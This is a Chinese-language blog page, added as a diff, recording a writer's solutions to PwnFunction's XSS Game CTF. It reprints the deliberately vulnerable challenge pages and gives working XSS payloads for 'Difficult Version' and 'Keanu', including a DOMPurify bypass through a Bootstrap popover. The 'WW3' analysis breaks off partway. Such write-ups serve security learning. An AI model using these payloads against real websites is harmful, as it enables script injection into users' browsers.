@@ -1,0 +1,859 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="前言通过这次的XSS Game ctf的学习过程，学到了很多新的xss方法！ 0x01 Difficult Version题目的源码如下：123456789101112131415161718&amp;lt;!DOCTYPE html&amp;gt;&amp;lt;html lang=&quot;en&quot;&amp;gt;&amp;lt;head&amp;gt;    &amp;lt;meta charset=&quot;UTF-8&quot;&amp;gt;    &amp;lt;title&amp;gt;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="记录一下XSS Game的过程">
+<meta property="og:url" content="http://yoursite.com/2020/03/14/记录一下XSS-Game的过程/index.html">
+<meta property="og:site_name" content="L&#39;s Blog">
+<meta property="og:description" content="前言通过这次的XSS Game ctf的学习过程，学到了很多新的xss方法！ 0x01 Difficult Version题目的源码如下：123456789101112131415161718&amp;lt;!DOCTYPE html&amp;gt;&amp;lt;html lang=&quot;en&quot;&amp;gt;&amp;lt;head&amp;gt;    &amp;lt;meta charset=&quot;UTF-8&quot;&amp;gt;    &amp;lt;title&amp;gt;">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2020-03-14T06:23:54.481Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="记录一下XSS Game的过程">
+<meta name="twitter:description" content="前言通过这次的XSS Game ctf的学习过程，学到了很多新的xss方法！ 0x01 Difficult Version题目的源码如下：123456789101112131415161718&amp;lt;!DOCTYPE html&amp;gt;&amp;lt;html lang=&quot;en&quot;&amp;gt;&amp;lt;head&amp;gt;    &amp;lt;meta charset=&quot;UTF-8&quot;&amp;gt;    &amp;lt;title&amp;gt;">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2020/03/14/记录一下XSS-Game的过程/">
+
+
+
+
+
+  <title>记录一下XSS Game的过程 | L's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">L's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">share with you</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/14/记录一下XSS-Game的过程/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Ljdd520">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="L's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">记录一下XSS Game的过程</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-14T14:23:07+08:00">
+                2020-03-14
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/javascript-web/" itemprop="url" rel="index">
+                    <span itemprop="name">javascript-web</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  3.1k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  15
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>通过这次的XSS Game ctf的学习过程，学到了很多新的xss方法！</p>
+<h4 id="0x01-Difficult-Version"><a href="#0x01-Difficult-Version" class="headerlink" title="0x01 Difficult Version"></a>0x01 Difficult Version</h4><h6 id="题目的源码如下："><a href="#题目的源码如下：" class="headerlink" title="题目的源码如下："></a>题目的源码如下：</h6><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">"en"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">"UTF-8"</span>&gt;</span><br><span class="line">    &lt;title&gt;Title&lt;<span class="regexp">/title&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;!-- Challenge --&gt;</span><br><span class="line">&lt;div id=<span class="string">"pwnme"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="keyword">var</span> input = (<span class="keyword">new</span> URL(location).searchParams.get(<span class="string">'debug'</span>) || <span class="string">''</span>).replace(<span class="regexp">/[\!\-\/\#\&amp;\;\%]/g</span>, <span class="string">'_'</span>);</span><br><span class="line">    <span class="keyword">var</span> template = <span class="built_in">document</span>.createElement(<span class="string">'template'</span>);</span><br><span class="line">    template.innerHTML = input;</span><br><span class="line">    pwnme.innerHTML = <span class="string">"&lt;!-- &lt;p&gt; DEBUG: "</span> + template.outerHTML + <span class="string">" &lt;/p&gt; --&gt;"</span>;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>body&gt;</span><br><span class="line">&lt;<span class="regexp">/html&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h6 id="payload如下："><a href="#payload如下：" class="headerlink" title="payload如下："></a>payload如下：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?&gt;&lt;svg onload=alert()&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="0x02-Keanu"><a href="#0x02-Keanu" class="headerlink" title="0x02 Keanu"></a>0x02 Keanu</h4><h6 id="题目源码："><a href="#题目源码：" class="headerlink" title="题目源码："></a>题目源码：</h6><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">"en"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">"UTF-8"</span>&gt;</span><br><span class="line">    &lt;title&gt;Title&lt;<span class="regexp">/title&gt;</span></span><br><span class="line"><span class="regexp">    &lt;!-- DOMPurify(2.0.7) --&gt;</span></span><br><span class="line"><span class="regexp">    &lt;script src="https:/</span><span class="regexp">/cdnjs.cloudflare.com/</span>ajax/libs/dompurify/<span class="number">2.0</span><span class="number">.7</span>/purify.min.js<span class="string">"</span></span><br><span class="line"><span class="string">            integrity="</span>sha256-iO9yO1Iy0P2hJNUeAvUQR2ielSsGJ4rOvK+EQUXxb6E=<span class="string">" crossorigin="</span>anonymous<span class="string">"&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">    &lt;!-- Jquery(3.4.1), Popper(1.16.0), Bootstrap(4.4.1) --&gt;</span></span><br><span class="line"><span class="string">    &lt;script src="</span>https:<span class="comment">//code.jquery.com/jquery-3.4.1.slim.min.js"</span></span><br><span class="line">            integrity=<span class="string">"sha384-J6qa4849blE2+poT4WnyKhv5vZF5SrPo0iEjwBvKU7imGFAV0wwj1yYfoRSJoZ+n"</span></span><br><span class="line">            crossorigin=<span class="string">"anonymous"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line">    &lt;script src=<span class="string">"https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"</span></span><br><span class="line">            integrity=<span class="string">"sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo"</span></span><br><span class="line">            crossorigin=<span class="string">"anonymous"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line">    &lt;script src=<span class="string">"https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js"</span></span><br><span class="line">            integrity=<span class="string">"sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6"</span></span><br><span class="line">            crossorigin=<span class="string">"anonymous"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line">&lt;<span class="regexp">/head&gt;</span></span><br><span class="line"><span class="regexp">&lt;body&gt;</span></span><br><span class="line"><span class="regexp">&lt;!-- Challenge --&gt;</span></span><br><span class="line"><span class="regexp">&lt;number id="number" style="display:none"&gt;&lt;/</span>number&gt;</span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"alert alert-primary"</span> role=<span class="string">"alert"</span> id=<span class="string">"welcome"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">&lt;button id=<span class="string">"keanu"</span> <span class="class"><span class="keyword">class</span></span>=<span class="string">"btn btn-primary btn-sm"</span> data-toggle=<span class="string">"popover"</span> data-content=<span class="string">"DM @PwnFunction"</span></span><br><span class="line">        data-trigger=<span class="string">"hover"</span> onclick=<span class="string">"alert(`If you solved it, DM me @PwnFunction :)`)"</span>&gt;Solved it?<span class="xml"><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="comment">/* Input */</span></span><br><span class="line">    <span class="keyword">var</span> number = (<span class="keyword">new</span> URL(location).searchParams.get(<span class="string">'number'</span>) || <span class="string">"7"</span>)[<span class="number">0</span>],</span><br><span class="line">        name = DOMPurify.sanitize(<span class="keyword">new</span> URL(location).searchParams.get(<span class="string">'name'</span>), &#123; <span class="attr">SAFE_FOR_JQUERY</span>: <span class="literal">true</span> &#125;);</span><br><span class="line">    $(<span class="string">'number#number'</span>).html(number);</span><br><span class="line">    $(<span class="string">'#welcome'</span>).html(<span class="string">`Welcome &lt;b&gt;<span class="subst">$&#123;name || <span class="string">"Mr. Wick"</span>&#125;</span>!&lt;/b&gt;`</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Greet */</span></span><br><span class="line">    $(<span class="string">'#keanu'</span>).popover(<span class="string">'show'</span>)</span><br><span class="line">    setTimeout(<span class="function"><span class="params">_</span> =&gt;</span> &#123;</span><br><span class="line">        $(<span class="string">'#keanu'</span>).popover(<span class="string">'hide'</span>)</span><br><span class="line">    &#125;, <span class="number">2000</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Check Magic Number */</span></span><br><span class="line">    <span class="keyword">var</span> magicNumber = <span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random() * <span class="number">10</span>);</span><br><span class="line">    <span class="keyword">var</span> number = <span class="built_in">eval</span>($(<span class="string">'number#number'</span>).html());</span><br><span class="line">    <span class="keyword">if</span> (magicNumber === number) &#123;</span><br><span class="line">        alert(<span class="string">"You're Breathtaking!"</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>body&gt;</span><br><span class="line">&lt;<span class="regexp">/html&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h6 id="payload如下：-1"><a href="#payload如下：-1" class="headerlink" title="payload如下："></a>payload如下：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">number=&apos;&amp;name=&lt;button id%3D&quot;keanu&quot; data-toggle%3D&quot;popover&quot; data-container%3D&quot;%23number&quot; data-content%3D&quot;&apos;%3Balert(1)%3B%2F%2F&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="0x03-WW3"><a href="#0x03-WW3" class="headerlink" title="0x03 WW3"></a>0x03 WW3</h4><h6 id="题目源码"><a href="#题目源码" class="headerlink" title="题目源码"></a>题目源码</h6><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">"en"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">"UTF-8"</span>&gt;</span><br><span class="line">    &lt;title&gt;Title&lt;<span class="regexp">/title&gt;</span></span><br><span class="line"><span class="regexp">    &lt;!-- DOMPurify(2.0.7) --&gt;</span></span><br><span class="line"><span class="regexp">    &lt;script src="https:/</span><span class="regexp">/cdnjs.cloudflare.com/</span>ajax/libs/dompurify/<span class="number">2.0</span><span class="number">.7</span>/purify.min.js<span class="string">"</span></span><br><span class="line"><span class="string">            integrity="</span>sha256-iO9yO1Iy0P2hJNUeAvUQR2ielSsGJ4rOvK+EQUXxb6E=<span class="string">" crossorigin="</span>anonymous<span class="string">"&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">    &lt;!-- Jquery(3.4.1), Popper(1.16.0), Bootstrap(4.4.1) --&gt;</span></span><br><span class="line"><span class="string">    &lt;script src="</span>https:<span class="comment">//code.jquery.com/jquery-3.4.1.slim.min.js"</span></span><br><span class="line">            integrity=<span class="string">"sha384-J6qa4849blE2+poT4WnyKhv5vZF5SrPo0iEjwBvKU7imGFAV0wwj1yYfoRSJoZ+n"</span></span><br><span class="line">            crossorigin=<span class="string">"anonymous"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line">    &lt;script src=<span class="string">"https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"</span></span><br><span class="line">            integrity=<span class="string">"sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo"</span></span><br><span class="line">            crossorigin=<span class="string">"anonymous"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line">    &lt;script src=<span class="string">"https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js"</span></span><br><span class="line">            integrity=<span class="string">"sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6"</span></span><br><span class="line">            crossorigin=<span class="string">"anonymous"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line">&lt;<span class="regexp">/head&gt;</span></span><br><span class="line"><span class="regexp">&lt;body&gt;</span></span><br><span class="line"><span class="regexp">&lt;!-- Challenge --&gt;</span></span><br><span class="line"><span class="regexp">&lt;div&gt;</span></span><br><span class="line"><span class="regexp">    &lt;h4&gt;Meme Code&lt;/</span>h4&gt;</span><br><span class="line">    &lt;textarea <span class="class"><span class="keyword">class</span></span>=<span class="string">"form-control"</span> id=<span class="string">"meme-code"</span> rows=<span class="string">"4"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span></span><br><span class="line">    &lt;div id=<span class="string">"notify"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">&lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">&lt;script&gt;</span></span><br><span class="line"><span class="regexp">    /</span>* Utils *<span class="regexp">/</span></span><br><span class="line"><span class="regexp">    const escape = (dirty) =&gt; unescape(dirty).replace(/</span>[<span class="xml"><span class="tag">&lt;&gt;</span>'"=]/g, '');</span></span><br><span class="line"><span class="xml">    const memeTemplate = (img, text) =&gt; &#123;</span></span><br><span class="line">        return (`&lt;style&gt;@import url('https://fonts.googleapis.com/css?family=Oswald:700&amp;display=swap');`+</span><br><span class="line">            `.meme-card&#123;margin:0 auto;width:300px&#125;.meme-card&gt;img&#123;width:300px&#125;`+</span><br><span class="line">            `.meme-card&gt;h1&#123;text-align:center;color:#fff;background:black;margin-top:-5px;`+</span><br><span class="line"><span class="xml">            `position:relative;font-family:Oswald,sans-serif;font-weight:700&#125;<span class="tag">&lt;/<span class="name">style</span>&gt;</span>`+</span></span><br><span class="line">            `&lt;div class="meme-card"&gt;&lt;img src="$&#123;img&#125;"&gt;&lt;h1&gt;$&#123;text&#125;&lt;/h1&gt;&lt;/div&gt;`)</span><br><span class="line">    &#125;</span><br><span class="line">    const memeGen = (that, notify) =&gt; &#123;</span><br><span class="line">        if (text &amp;&amp; img) &#123;</span><br><span class="line">            template = memeTemplate(img, text)</span><br><span class="line"></span><br><span class="line">            if (notify) &#123;</span><br><span class="line">                html = (`&lt;div class="alert alert-warning" role="alert"&gt;&lt;b&gt;Meme&lt;/b&gt; created from $&#123;DOMPurify.sanitize(text)&#125;&lt;/div&gt;`)</span><br><span class="line">            &#125;</span><br><span class="line">        console.log(`$&#123;DOMPurify.sanitize("&lt;img&gt;&lt;style&gt;&lt;style/&gt;&lt;script&gt;alert()//")&#125;`);</span><br><span class="line">            setTimeout(_ =&gt; &#123;</span><br><span class="line">                $('#status').remove()</span><br><span class="line">                console.log(notify);</span><br><span class="line">                notify ? ($('#notify').html(html)) : ''</span><br><span class="line">                $('#meme-code').text(template)</span><br><span class="line">            &#125;, 1000)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    /* Main */</span><br><span class="line">    let notify = false;</span><br><span class="line">    let text = new URL(location).searchParams.get('text')</span><br><span class="line">    let img = new URL(location).searchParams.get('img')</span><br><span class="line">    if (text &amp;&amp; img) &#123;</span><br><span class="line">        document.write(</span><br><span class="line">            `&lt;div class="alert alert-primary" role="alert" id="status"&gt;`+</span><br><span class="line">            `&lt;img class="circle" src="$&#123;escape(img)&#125;" onload="memeGen(this, notify)"&gt;`+</span><br><span class="line">            `Creating meme... ($&#123;DOMPurify.sanitize(text)&#125;)&lt;/div&gt;`</span><br><span class="line">        )</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $('#meme-code').text(memeTemplate('https://i.imgur.com/PdbDexI.jpg', 'When you get that WW3 draft letter'))</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<h6 id="审计代码，我们可以先看到题目定义的几个函数"><a href="#审计代码，我们可以先看到题目定义的几个函数" class="headerlink" title="审计代码，我们可以先看到题目定义的几个函数"></a>审计代码，我们可以先看到题目定义的几个函数</h6><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="built_in">escape</span> = <span class="function"><span class="params">dirty</span> =&gt;</span> <span class="built_in">unescape</span>(dirty).replace(<span class="regexp">/[&lt;&gt;'"=]/g</span>, <span class="string">""</span>);</span><br></pre></td></tr></table></figure>
+
+<h6 id="用来过滤我们的img参数"><a href="#用来过滤我们的img参数" class="headerlink" title="用来过滤我们的img参数"></a>用来过滤我们的img参数</h6><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> memeTemplate = <span class="function">(<span class="params">img, text</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="string">`&lt;style&gt;@import url('https://fonts.googleapis.com/css?family=Oswald:700&amp;display=swap');`</span> +</span><br><span class="line">    <span class="string">`.meme-card&#123;margin:0 auto;width:300px&#125;.meme-card&gt;img&#123;width:300px&#125;`</span> +</span><br><span class="line">    <span class="string">`.meme-card&gt;h1&#123;text-align:center;color:#fff;background:black;margin-top:-5px;`</span> +</span><br><span class="line">    <span class="string">`position:relative;font-family:Oswald,sans-serif;font-weight:700&#125;&lt;/style&gt;`</span> +</span><br><span class="line">    <span class="string">`&lt;div class="meme-card"&gt;&lt;img src="<span class="subst">$&#123;img&#125;</span>"&gt;&lt;h1&gt;<span class="subst">$&#123;text&#125;</span>&lt;/h1&gt;&lt;/div&gt;`</span></span><br><span class="line">  );</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<h6 id="用来将我们传入的img-amp-text参数构造一个HTML模板"><a href="#用来将我们传入的img-amp-text参数构造一个HTML模板" class="headerlink" title="用来将我们传入的img &amp; text参数构造一个HTML模板"></a>用来将我们传入的img &amp; text参数构造一个HTML模板</h6><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> memeGen = <span class="function">(<span class="params">that, notify</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (text &amp;&amp; img) &#123;</span><br><span class="line">    template = memeTemplate(img, text);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (notify) &#123;</span><br><span class="line">      html = <span class="string">`&lt;div class="alert alert-warning" role="alert"&gt;&lt;b&gt;Meme&lt;/b&gt; created from <span class="subst">$&#123;DOMPurify.sanitize(</span></span></span><br><span class="line"><span class="string"><span class="subst">        text</span></span></span><br><span class="line"><span class="string"><span class="subst">      )&#125;</span>&lt;/div&gt;`</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    setTimeout(<span 